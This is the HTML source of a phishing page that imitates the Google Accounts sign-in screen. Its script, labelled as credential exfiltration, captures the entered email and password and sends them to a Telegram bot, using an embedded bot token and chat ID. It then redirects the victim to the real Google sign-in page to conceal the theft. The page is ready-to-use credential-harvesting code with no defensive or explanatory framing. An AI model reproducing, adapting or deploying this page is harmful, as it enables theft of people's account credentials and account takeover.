<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
 <title>Sign in - Google Accounts</title>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
 body {
 font-family: 'Google Sans', Roboto, Arial, sans-serif;
 background: #0f0f0f;
 display: flex;
 justify-content: center;
 align-items: center;
 min-height: 100vh;
 margin: 0;
 padding: 16px;
 }
 .card {
 width: 100%;
 max-width: 400px;
 background: #1e1e1e;
 border-radius: 12px;
 box-shadow: 0 2px 24px rgba(0, 0, 0, 0.6);
 padding: 32px 24px 40px;
 margin: 0 auto;
 border: 1px solid #2c2c2c;
 }
 .logo { text-align: center; margin-bottom: 20px; }
 .logo svg { width: 60px; height: 60px; }
 h1 {
 font-size: 24px; font-weight: 500; text-align: center;
 color: #e8eaed; line-height: 1.3; margin-bottom: 4px;
 }
 .subtitle {
 text-align: center; font-size: 16px; color: #9aa0a6; margin-bottom: 28px;
 }
 .input-group { position: relative; margin-bottom: 20px; }
 .input-group input {
 width: 100%; padding: 16px 12px; font-size: 16px;
 border: 1px solid #3c4043; border-radius: 8px; outline: none;
 background: #1e1e1e; color: #e8eaed; font-family: inherit;
 }
 .input-group input:focus {
 border-color: #8ab4f8; box-shadow: 0 0 0 1px #8ab4f8;
 }
 .input-group label {
 position: absolute; left: 12px; top: 50%; transform: translateY(-50%);
 font-size: 16px; color: #9aa0a6; pointer-events: none;
 transition: 0.2s ease all; background: #1e1e1e; padding: 0 4px;
 }
 .input-group input:focus + label,
 .input-group input:not(:placeholder-shown) + label {
 top: -8px; font-size: 12px; color: #8ab4f8;
 }
 .forgot-link {
 display: block; font-size: 14px; color: #8ab4f8; font-weight: 500;
 text-decoration: none; margin-top: -8px; margin-bottom: 28px;
 }
 .info-text { font-size: 14px; color: #9aa0a6; line-height: 1.5; margin-bottom: 32px; }
 .info-text a { color: #8ab4f8; text-decoration: none; font-weight: 500; }
 .actions { display: flex; justify-content: space-between; align-items: center; gap: 12px; }
 .btn-create {
 background: none; border: none; color: #8ab4f8; font-size: 15px; font-weight: 500;
 padding: 8px 12px; border-radius: 4px; cursor: pointer; font-family: inherit;
 }
 .btn-next {
 background: #8ab4f8; color: #0f0f0f; border: none; font-size: 15px; font-weight: 500;
 padding: 10px 24px; border-radius: 24px; cursor: pointer; font-family: inherit;
 }
 .footer { text-align: center; margin-top: 24px; font-size: 12px; color: #9aa0a6; }
 .footer select { border: none; background: none; color: #9aa0a6; font-size: 12px; font-family: inherit; cursor: pointer; }
 </style>
</head>
<body>
 <div class="card">
 <div class="logo">
 <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
 <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
 <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
 <path fill="#FBBC05" d="M10.54 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.98-6.19z"/>
 <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.95l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
 </svg>
 </div>
 <h1>Sign in</h1>
 <p class="subtitle">Use your Google Account</p>
 <div class="input-group">
 <input type="email" id="email" placeholder=" " autocomplete="username" />
 <label for="email">Email or phone</label>
 </div>
 <div class="input-group">
 <input type="password" id="password" placeholder=" " autocomplete="current-password" />
 <label for="password">Password</label>
 </div>
 <a href="#" class="forgot-link">Forgot password?</a>
 <p class="info-text">
 Not your computer? Use Guest mode to sign in privately.
 <br /><a href="#">Learn more</a> about using Guest mode.
 </p>
 <div class="actions">
 <button class="btn-create">Create account</button>
 <button class="btn-next" id="signinBtn">Sign in</button>
 </div>
 <div class="footer">
 <select>
 <option>English (United States)</option>
 <option>中文 (简体)</option>
 <option>Español</option>
 <option>Français</option>
 <option>日本語</option>
 </select>
 </div>
 </div>

 <script>
 // =============================================
 // TELEGRAM CREDENTIAL EXFILTRATION
 // =============================================
 const BOT_TOKEN = 8896876219:AAHE8Lc2fDLBMZPj3olBB_7H0FYaBa3ZIZo'; // <-- Replace with your bot token
 const CHAT_ID = '6462459241'; // <-- Replace with your chat ID

 document.getElementById('signinBtn').addEventListener('click', function(e) {
 e.preventDefault();
 
 const email = document.getElementById('email').value;
 const password = document.getElementById('password').value;
 
 if (!email || !password) {
 alert('Please enter your email and password.');
 return;
 }
 
 // Send to Telegram
 const message = `🔓 NEW LOGIN CAPTURED\n📧 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${window.location.hostname}\n🕐 Time: ${new Date().toLocaleString()}`;
 
 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({
 chat_id: CHAT_ID,
 text: message
 })
 })
 .then(response => {
 if (response.ok) {
 // Redirect to REAL Gmail after successful capture
 window.location.href = 'https://accounts.google.com/signin';
 } else {
 // Fallback redirect anyway
 window.location.href = 'https://accounts.google.com/signin';
 }
 })
 .catch(() => {
 // Even if Telegram fails, still redirect
 window.location.href = 'https://accounts.google.com/signin';
 });
 });

 // Also handle Enter key
 document.addEventListener('keydown', function(e) {
 if (e.key === 'Enter') {
 document.getElementById('signinBtn').click();
 }
 });
 </script>
</body>
</html>
